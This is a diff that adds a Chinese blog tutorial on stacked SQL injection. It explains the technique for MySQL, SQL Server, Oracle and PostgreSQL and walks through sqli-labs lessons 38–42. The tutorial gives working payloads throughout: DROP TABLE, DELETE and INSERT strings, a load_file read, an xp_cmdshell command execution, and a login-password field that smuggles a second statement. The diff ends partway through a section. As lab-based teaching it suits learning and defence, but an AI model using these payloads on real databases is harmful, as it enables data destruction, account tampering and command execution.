@@ -71,6 +71,234 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-Web/注入漏洞/SQL注入/堆叠注入 stacked  injection" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%20stacked%20%20injection/" class="article-date">
+  <time class="dt-published" datetime="2025-05-20T00:55:56.000Z" itemprop="datePublished">2025-05-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="堆叠注入-stacked-injection"><a href="#堆叠注入-stacked-injection" class="headerlink" title="堆叠注入 stacked  injection"></a>堆叠注入 stacked  injection</h1><h1 id="堆叠注入原理"><a href="#堆叠注入原理" class="headerlink" title="堆叠注入原理"></a>堆叠注入原理</h1><blockquote>
+<p>mysql数据库sql语句的默认结束符是以&#x3D;&#x3D;;结尾&#x3D;&#x3D;，在执行多条SQL语句时就要使用结束符隔开，那么在;结束一条sql语句后继续构造下一条语句，是否会一起执行？因此这个想法也就造就了堆叠注入</p>
+<p>而&#x3D;&#x3D;union injection（联合注入）&#x3D;&#x3D;也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句&#x3D;&#x3D;类型是有限&#x3D;&#x3D;的，可以用来执行查询语句，而堆叠注入可以&#x3D;&#x3D;执行&#x3D;&#x3D;的是&#x3D;&#x3D;任意的语句&#x3D;&#x3D;。</p>
+<p><strong>eg</strong></p>
+<p>用户输入：<code>1; DELETE FROM products</code>​</p>
+<p>服务器端生成的sql语句为：<code> Select * from products where productid=1;DELETE FROM products</code>​</p>
+<p>当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p>
+</blockquote>
+<p>‍</p>
+<h1 id="堆叠注入的局限性"><a href="#堆叠注入的局限性" class="headerlink" title="堆叠注入的局限性"></a>堆叠注入的局限性</h1><blockquote>
+<p>堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。</p>
+<p><img src="/.com//1049983-20180929015645345-261813262-20250418142338-b14gqor.gif" alt="1049983-20180929015645345-261813262"></p>
+<p>此图是从<strong>原文</strong>中<strong>截取</strong>过来的，因为我个人的<strong>测试环境</strong>是<strong>php+mysql</strong>，是<strong>可以执行</strong>的，此处对于<strong>mysql&#x2F;php存在质疑</strong>。但个人估计原文作者可能与我的<strong>版本的不同</strong>的原因。虽然我们前面提到了堆叠查询可以<strong>执行任意的sql</strong>语句，但是这种注入方式<strong>并不是</strong>十分的<strong>完美</strong>的。在我们的web系统中，因为代码通常<strong>只返回一个查询结果</strong>，因此，堆叠注入<strong>第二个</strong>语句<strong>产生错误</strong>或者<strong>结果</strong>只能被<strong>忽略</strong>，我们在<strong>前端</strong>界面是<strong>无法看到</strong>返回<strong>结果</strong>的。因此，在读取数据时，我们建议使用<strong>union（联合）</strong> 注入。同时在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的，例如表名，列名等信息。</p>
+</blockquote>
+<p>‍</p>
+<h2 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h2><p>（1）新建一表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1;create table test like users;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.com//1049983-20180929015645671-1445708848-20250418145452-5bj63io.gif" alt="1049983-20180929015645671-1445708848"></p>
+<p>执行成功，我们再去看一下是否新建成功表。</p>
+<p><img src="/.com//1049983-20180929015645943-40278598-20250418145455-12lvk48.gif" alt="1049983-20180929015645943-40278598"></p>
+<p>（2）删除上面新建的test表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1;drop table test;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.com//1049983-20180929015646198-1529755622-20250418145501-moc8u2z.gif" alt="1049983-20180929015646198-1529755622"></p>
+<p><img src="/.com//1049983-20180929015646449-976012187-20250418145504-r5c54as.gif" alt="1049983-20180929015646449-976012187"></p>
+<p>（3）查询数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1;select 1,2,3;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.com//1049983-20180929015646651-307633841-20250418145508-luvcepa.gif" alt="1049983-20180929015646651-307633841"></p>
+<p>（4）加载文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1;select load_file(&#x27;c:/tmpupbbn.php&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.com//1049983-20180929015646928-818625825-20250418145512-1v55m2l.gif" alt="1049983-20180929015646928-818625825"></p>
+<p>(4) 修改数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1;insert into users(id,username,password) values (&#x27;100&#x27;,&#x27;new&#x27;,&#x27;new&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.com//1049983-20180929015647123-855312514-20250418145524-9w3iwfi.gif" alt="1049983-20180929015647123-855312514"></p>
+<p><img src="/.com//1049983-20180929015647385-1686789783-20250418145527-uwrbwtv.gif" alt="1049983-20180929015647385-1686789783"></p>
+<h2 id="2-Sql-server"><a href="#2-Sql-server" class="headerlink" title="2. Sql server"></a>2. Sql server</h2><p>(1)增加数据表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test;create table sc3(ss CHAR(8));</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.com//1049983-20180929015647694-982429887-20250418145531-s83ngpd.gif" alt="1049983-20180929015647694-982429887"></p>
+<p>(2) 删除数据表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test;drop table sc3;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.com//1049983-20180929015648051-1234311462-20250418145535-qf3clju.gif" alt="1049983-20180929015648051-1234311462"></p>
+<p>(4)查询数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,3;select * from test;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.com//1049983-20180929015648347-1625714699-20250418145539-j8nkra8.gif" alt="1049983-20180929015648347-1625714699"></p>
+<p>(5)修改数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test;update test set name=&#x27;test&#x27; where id=3;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.com//1049983-20180929015648636-932399825-20250418145545-ple8xai.gif" alt="1049983-20180929015648636-932399825"></p>
+<p><img src="/.com//1049983-20180929015648911-1380875302-20250418145559-oh45cnc.gif" alt="1049983-20180929015648911-1380875302"></p>
+<p>(5)sqlserver中最为重要的存储过程的执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1;exec master..xp_cmdshell &#x27;ipconfig&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.com//1049983-20180929015649295-413295225-20250418145603-v0relca.gif" alt="1049983-20180929015649295-413295225"></p>
+<h2 id="3-Oracle"><a href="#3-Oracle" class="headerlink" title="3.Oracle"></a>3.Oracle</h2><blockquote>
+<p>上面的介绍中我们已经提及，&#x3D;&#x3D;oracle不能使用堆叠注入&#x3D;&#x3D;，可以从图中看到，当有&#x3D;&#x3D;两条语句在同一行时&#x3D;&#x3D;，&#x3D;&#x3D;直接报错,无效字符&#x3D;&#x3D;。后面的就不往下继续尝试了。</p>
+</blockquote>
+<p><img src="/.com//1049983-20180929015649555-1984392073-20250418145608-d8axt98.gif" alt="1049983-20180929015649555-1984392073"></p>
+<h2 id="4-Postgresql"><a href="#4-Postgresql" class="headerlink" title="4.Postgresql"></a>4.Postgresql</h2><p>(1)新建一个表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user_test;create table user_data(id DATE);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.com//1049983-20180929015649893-911848487-20250418145612-l3ok6px.gif" alt="1049983-20180929015649893-911848487"></p>
+<p><img src="/.com//1049983-20180929015650150-1255028615-20250418145614-5fdv2lo.gif" alt="1049983-20180929015650150-1255028615"></p>
+<p>可以看到user_data表已经建好。</p>
+<p>(2)删除上面新建的user_data表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user_test;delete from user_data;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.com//1049983-20180929015650516-1080177008-20250418145618-y3ccfz0.gif" alt="1049983-20180929015650516-1080177008"></p>
+<p>(3)查询数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user_test;select 1,2,3;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.com//1049983-20180929015650885-769688906-20250418145621-rkshp8y.gif" alt="1049983-20180929015650885-769688906"></p>
+<p>(4) 修改数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user_test;update user_test set name=&#x27;modify&#x27; where name=&#x27;张三&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.com//1049983-20180929015651359-2117725775-20250418145626-lnlx1c8.gif" alt="1049983-20180929015651359-2117725775"></p>
+<p>‍</p>
+<h2 id="0x04-堆叠注入之sqllaps实列"><a href="#0x04-堆叠注入之sqllaps实列" class="headerlink" title="0x04 堆叠注入之sqllaps实列"></a>0x04 堆叠注入之sqllaps实列</h2><h2 id="1-Less-38-堆叠注入-字符型-GET"><a href="#1-Less-38-堆叠注入-字符型-GET" class="headerlink" title="1.Less-38 堆叠注入 - 字符型 - GET"></a>1.Less-38 堆叠注入 - 字符型 - GET</h2><p>（1）源代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>（2）测试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1’;insert into users(id,username,password) values (‘38’,’less38’,’hello’)–+</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">+----+----------+------------+</span><br><span class="line"></span><br><span class="line">| id | username | password   |</span><br><span class="line"></span><br><span class="line">+----+----------+------------+</span><br><span class="line"></span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line"></span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line"></span><br><span class="line">|  3 | Dummy    | p@ssword   |</span><br><span class="line"></span><br><span class="line">|  4 | secure   | crappy     |</span><br><span class="line"></span><br><span class="line">|  5 | stupid   | stupidity  |</span><br><span class="line"></span><br><span class="line">|  6 | superman | genious    |</span><br><span class="line"></span><br><span class="line">|  7 | batman   | mob!le     |</span><br><span class="line"></span><br><span class="line">|  8 | admin    | admin      |</span><br><span class="line"></span><br><span class="line">|  9 | admin1   | admin1     |</span><br><span class="line"></span><br><span class="line">| 10 | admin2| admin2     |</span><br><span class="line"></span><br><span class="line">| 11 | admin3| admin3     |</span><br><span class="line"></span><br><span class="line">| 12 | dhakkan| dumbo      |</span><br><span class="line"></span><br><span class="line">| 14 | admin4| admin4     |</span><br><span class="line"></span><br><span class="line">| 38 | less38| hello      |</span><br><span class="line"></span><br><span class="line">+----+----------+------------+</span><br><span class="line"></span><br><span class="line">14 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>发现已经添加了一个 less38 用户</p>
+<p>?id=1’;create table less38 like users;</p>
+<p>?id=1’;drop table less38;</p>
+<h2 id="2-Less-39-堆叠注入-整型-GET"><a href="#2-Less-39-堆叠注入-整型-GET" class="headerlink" title="2.Less-39 堆叠注入 - 整型 - GET"></a>2.Less-39 堆叠注入 - 整型 - GET</h2><p>（1）源代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>（2）测试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1;insert into users(id,username,password) values (‘39’,’less39’,’hello’)–-</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users;</span><br><span class="line"></span><br><span class="line">+----+----------+------------+</span><br><span class="line"></span><br><span class="line">| id | username | password   |</span><br><span class="line"></span><br><span class="line">+----+----------+------------+</span><br><span class="line"></span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line"></span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line"></span><br><span class="line">|  3 | Dummy    | p@ssword   |</span><br><span class="line"></span><br><span class="line">|  4 | secure   | crappy     |</span><br><span class="line"></span><br><span class="line">|  5 | stupid   | stupidity  |</span><br><span class="line"></span><br><span class="line">|  6 | superman | genious    |</span><br><span class="line"></span><br><span class="line">|  7 | batman   | mob!le     |</span><br><span class="line"></span><br><span class="line">|  8 | admin    | admin      |</span><br><span class="line"></span><br><span class="line">|  9 | admin1   | admin1     |</span><br><span class="line"></span><br><span class="line">| 10 | admin2| admin2     |</span><br><span class="line"></span><br><span class="line">| 11 | admin3| admin3     |</span><br><span class="line"></span><br><span class="line">| 12 | dhakkan| dumbo      |</span><br><span class="line"></span><br><span class="line">| 14 | admin4| admin4     |</span><br><span class="line"></span><br><span class="line">| 38 | less38| hello      |</span><br><span class="line"></span><br><span class="line">| 39 | less39| hello      |</span><br><span class="line"></span><br><span class="line">+----+----------+------------+</span><br><span class="line"></span><br><span class="line">15 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>可以看到已经添加了 less39 用户了</p>
+<p>?id=1;create table less39 like users;</p>
+<p>?id=1;drop table less39;</p>
+<h2 id="3-Less-40-盲注-堆叠注入-字符型-GET"><a href="#3-Less-40-盲注-堆叠注入-字符型-GET" class="headerlink" title="3.Less-40 盲注 - 堆叠注入 - 字符型 - GET"></a>3.Less-40 盲注 - 堆叠注入 - 字符型 - GET</h2><p>（1）源代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=(&#x27;$id&#x27;) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>（2）测试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1’); insert into users(id,username,password) values (‘40’,’less40’,’hello’)–+</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users;</span><br><span class="line"></span><br><span class="line">+-----+----------+------------+</span><br><span class="line"></span><br><span class="line">| id  | username | password   |</span><br><span class="line"></span><br><span class="line">+-----+----------+------------+</span><br><span class="line"></span><br><span class="line">|   1 | Dumb     | Dumb       |</span><br><span class="line"></span><br><span class="line">|   2 | Angelina | I-kill-you |</span><br><span class="line"></span><br><span class="line">|   3 | Dummy    | p@ssword   |</span><br><span class="line"></span><br><span class="line">|   4 | secure   | crappy     |</span><br><span class="line"></span><br><span class="line">|   5 | stupid   | stupidity  |</span><br><span class="line"></span><br><span class="line">|   6 | superman | genious    |</span><br><span class="line"></span><br><span class="line">|   7 | batman   | mob!le     |</span><br><span class="line"></span><br><span class="line">|   8 | admin    | admin      |</span><br><span class="line"></span><br><span class="line">|   9 | admin1   | admin1     |</span><br><span class="line"></span><br><span class="line">|  10 | admin2   | admin2     |</span><br><span class="line"></span><br><span class="line">|  11 | admin3   | admin3     |</span><br><span class="line"></span><br><span class="line">|  12 | dhakkan  | dumbo      |</span><br><span class="line"></span><br><span class="line">|  14 | admin4   | admin4     |</span><br><span class="line"></span><br><span class="line">|  38 | less38   | hello      |</span><br><span class="line"></span><br><span class="line">|  39 | less39   | hello      |</span><br><span class="line"></span><br><span class="line">| 109 | hello| hello      |</span><br><span class="line"></span><br><span class="line">|  40 | less40   | hello      |</span><br><span class="line"></span><br><span class="line">+-----+----------+------------+</span><br><span class="line"></span><br><span class="line">17 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>看到添加了 less40 用户</p>
+<p>?id=1’);create table less40 like users;</p>
+<p>?id=1’);drop table less40;</p>
+<h2 id="4-Less-41-盲注-堆叠注入-整型-GET"><a href="#4-Less-41-盲注-堆叠注入-整型-GET" class="headerlink" title="4.Less-41 盲注 - 堆叠注入 - 整型 - GET"></a>4.Less-41 盲注 - 堆叠注入 - 整型 - GET</h2><p>（1）源代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>（2）测试（盲注）</p>
+<p>创建users表和增加字段值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1; insert into users(id,username,password) values (‘110’,’less41’,’hello’)–+</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users;</span><br><span class="line"></span><br><span class="line">+-----+----------+------------+</span><br><span class="line"></span><br><span class="line">| id  | username | password   |</span><br><span class="line"></span><br><span class="line">+-----+----------+------------+</span><br><span class="line"></span><br><span class="line">|   1 | Dumb     | Dumb       |</span><br><span class="line"></span><br><span class="line">|   2 | Angelina | I-kill-you |</span><br><span class="line"></span><br><span class="line">|   3 | Dummy    | p@ssword   |</span><br><span class="line"></span><br><span class="line">|   4 | secure   | crappy     |</span><br><span class="line"></span><br><span class="line">|   5 | stupid   | stupidity  |</span><br><span class="line"></span><br><span class="line">|   6 | superman | genious    |</span><br><span class="line"></span><br><span class="line">|   7 | batman   | mob!le     |</span><br><span class="line"></span><br><span class="line">|   8 | admin    | admin      |</span><br><span class="line"></span><br><span class="line">|   9 | admin1   | admin1     |</span><br><span class="line"></span><br><span class="line">|  10 | admin2   | admin2     |</span><br><span class="line"></span><br><span class="line">|  11 | admin3   | admin3     |</span><br><span class="line"></span><br><span class="line">|  12 | dhakkan  | dumbo      |</span><br><span class="line"></span><br><span class="line">|  14 | admin4   | admin4     |</span><br><span class="line"></span><br><span class="line">|  38 | less38   | hello      |</span><br><span class="line"></span><br><span class="line">|  39 | less39   | hello      |</span><br><span class="line"></span><br><span class="line">| 109 | hello| hello      |</span><br><span class="line"></span><br><span class="line">|  40 | less40   | hello      |</span><br><span class="line"></span><br><span class="line">| 110 | less41| hello      |</span><br><span class="line"></span><br><span class="line">+-----+----------+------------+</span><br><span class="line"></span><br><span class="line">18 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>添加了用户 less41</p>
+<p>?id=1;create table less41 like users;  &#x2F;&#x2F;增加表</p>
+<p>?id=1;drop table less41;  &#x2F;&#x2F;删除表</p>
+<h2 id="5-Less-42-报错型堆叠注入-字符型-POST"><a href="#5-Less-42-报错型堆叠注入-字符型-POST" class="headerlink" title="5.Less-42 报错型堆叠注入 - 字符型 - POST"></a>5.Less-42 报错型堆叠注入 - 字符型 - POST</h2><p>（1）源代码（login.php）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$username = mysqli_real_escape_string($con1, $_POST[&quot;login_user&quot;]);</span><br><span class="line"></span><br><span class="line">$password = $_POST[&quot;login_password&quot;];</span><br><span class="line"></span><br><span class="line">$sql = &quot;SELECT * FROM users WHERE username=&#x27;$username&#x27; and password=&#x27;$password&#x27;&quot;;  </span><br></pre></td></tr></table></figure>
+
+<p><strong>Password</strong> 变量在<strong>post</strong> 过程中，<strong>没有</strong>通过 mysql_real_escape_string() <strong>函数</strong>的<strong>处理</strong>。因此在登录的时候<strong>密码选项</strong>我们可以进行 <strong>attack</strong>。</p>
+<p>（2）报错测试</p>
+<p>测试语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username：任意</span><br><span class="line"></span><br><span class="line">password ：  c&#x27;;drop table me#   # 删除 me 表</span><br></pre></td></tr></table></figure>
+
+<p>或者：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username：任意</span><br><span class="line"></span><br><span class="line">password ： c&#x27;;create table me like users# // 创建一个 me 表</span><br></pre></td></tr></table></figure>
+
+<p>登录之前查看表：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show tables;</span><br><span class="line"></span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">| Tables_in_security |</span><br><span class="line"></span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">| emails|</span><br><span class="line"></span><br><span class="line">| referers|</span><br><span class="line"></span><br><span class="line">| uagents|</span><br><span class="line"></span><br><span class="line">| users|</span><br><span class="line"></span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>登录前创建表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username ：admin</span><br><span class="line"></span><br><span class="line">password ：  c&#x27;;create table less42 like users#</span><br></pre></td></tr></table></figure>
+
+<p>登录后查看创建表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show tables;</span><br><span class="line"></span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">| Tables_in_security |</span><br><span class="line"></span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">| emails|</span><br><span class="line"></span><br><span class="line">| less42|</span><br><span class="line"></span><br><span class="line">| referers|</span><br><span class="line"></span><br><span class="line">| uagents|</span><br><span class="line"></span><br><span class="line">| users|</span><br><span class="line"></span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">5 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>发现添加了一个 less42 表，登录时构造的 sql 语句为:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE username=’admin’ and password=’c’;create table less42 like users–+     //利用 c’;drop table me#作为登录密码，删除该表。</span><br></pre></td></tr></table></figure>
+
+<p>登录前删除表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username： admin </span><br><span class="line">password ：  c’;drop table less42#</span><br></pre></td></tr></table></figure>
+
+<p>登录后查看删除表</p>
